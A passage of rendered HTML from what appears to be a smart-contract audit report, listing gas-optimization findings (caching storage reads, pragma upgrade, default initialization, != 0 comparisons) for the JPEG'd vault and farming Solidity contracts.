class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toWithdraw</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">backingTokens</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L177)</span></span></span></code></pre>\n<h2 id=\"g-30-yvaultwithdraw-token-should-get-cached\" style=\"position:relative;\"><a href=\"#g-30-yvaultwithdraw-token-should-get-cached\" aria-label=\"g 30 yvaultwithdraw token should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-30] <code>yVault.withdraw()</code>: <code>token</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">166</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">noContract</span><span class=\"mtk1\">(msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit gas: SLOAD 1 token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">backingTokens</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toWithdraw</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">backingTokens</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">), </span><span class=\"mtk12\">toWithdraw</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit gas: SLOAD 2 token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">backingTokens</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit gas: SLOAD 3 token</span></span></span></code></pre>\n<h2 id=\"g-31-yvaultwithdrawjpeg-farm-should-get-cached\" style=\"position:relative;\"><a href=\"#g-31-yvaultwithdrawjpeg-farm-should-get-cached\" aria-label=\"g 31 yvaultwithdrawjpeg farm should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-31] <code>yVault.withdrawJPEG()</code>: <code>farm</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdrawJPEG</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">farm</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;NO_FARM&quot;</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit gas: SLOAD 1 farm</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawJPEG</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">), </span><span class=\"mtk12\">farm</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">//@audit gas: SLOAD 2 farm</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"g-32-upgrade-pragma-to-at-least-084\" style=\"position:relative;\"><a href=\"#g-32-upgrade-pragma-to-at-least-084\" aria-label=\"g 32 upgrade pragma to at least 084 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-32] Upgrade pragma to at least 0.8.4</h2>\n<p>Across the whole solution, the declared pragma is <code>^0.8.0</code>.</p>\n<p>Using newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.</p>\n<p>The advantages here are:</p>\n<ul>\n<li><strong>Low level inliner</strong> (>= 0.8.2): Cheaper runtime gas (especially relevant when the contract has small functions).</li>\n<li><strong>Optimizer improvements in packed structs</strong> (>= 0.8.3)</li>\n<li><strong>Custom errors</strong> (>= 0.8.4): cheaper deployment cost and runtime cost. <em>Note</em>: the runtime cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.</li>\n</ul>\n<p>Consider upgrading pragma to at least 0.8.4:</p>\n<h2 id=\"g-33-no-need-to-explicitly-initialize-variables-with-default-values\" style=\"position:relative;\"><a href=\"#g-33-no-need-to-explicitly-initialize-variables-with-default-values\" aria-label=\"g 33 no need to explicitly initialize variables with default values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-33] No need to explicitly initialize variables with default values</h2>\n<p>If a variable is not set/initialized, it is assumed to have the default value (<code>0</code> for <code>uint</code>, <code>false</code> for <code>bool</code>, <code>address(0)</code> for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.</p>\n<p>As an example: <code>for (uint256 i = 0; i &#x3C; numIterations; ++i) {</code> should be replaced with <code>for (uint256 i; i &#x3C; numIterations; ++i) {</code></p>\n<p>Instances include:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">281</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pid</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">pid</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">pid</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">348</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">145</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_strategyConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">231</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">319</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">45</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ETH</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">181</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_typeInitializers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">184</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nfts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>I suggest removing explicit initializations for default values.</p>\n<h2 id=\"g-34--0-is-less-efficient-than--0-for-unsigned-integers-with-proof\" style=\"position:relative;\"><a href=\"#g-34--0-is-less-efficient-than--0-for-unsigned-integers-with-proof\" aria-label=\"g 34  0 is less efficient than  0 for unsigned integers with proof permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-34] <code>> 0</code> is less efficient than <code>!= 0</code> for unsigned integers (with proof)</h2>\n<p><code>!= 0</code> costs less gas compared to <code>> 0</code> for unsigned integers in <code>require</code> statements with the optimizer enabled (6 gas)</p>\n<p>Proof: While it may seem that <code>> 0</code> is cheaper than <code>!=</code>, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you’re in a <code>require</code> statement, this will save gas. You can see this tweet for more proofs: <a href=\"https://twitter.com/gzeon/status/1485428085885640706\">https://twitter.com/gzeon/status/1485428085885640706</a></p>\n<p>I suggest changing <code>> 0</code> with <code>!= 0</code> here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">114</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rewardPerBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid reward per block&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">218</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">239</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">337</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewards</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;no_reward&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">354</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewards</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;no_reward&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">101</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">118</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVaultLPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">139</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewards</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;no_reward&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lock</span><span class=\"mtk1\">/</span><span class=\"mtk12\">JPEGLock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">40</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newTime</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid lock time&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">JPEGStaking</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">32</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;invalid_amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">182</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">334</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wethBalance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;NOOP&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">img</span><span class=\"mtk1\"> </span><span class=\"mtk12\">class</span><span class=\"mtk1\">=</span><span class=\"mtk8\">&quot;emoji-icon&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">alt</span><span class=\"mtk1\">=</span><span class=\"mtk8\">&quot;emoji-100&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">-</span><span class=\"mtk12\">icon</span><span class=\"mtk1\">=</span><span class=\"mtk8\">&quot;emoji-100&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">style</span><span class=\"mtk1\">=</span><span class=\"mtk8\">&quot;display: inline; margin: 0; margin-top: 1px; position: relative; top: 5px; width: 25px&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">src</span><span class=\"mtk1\">=</span><span class=\"mtk8\">&quot;data:image/png;base64, 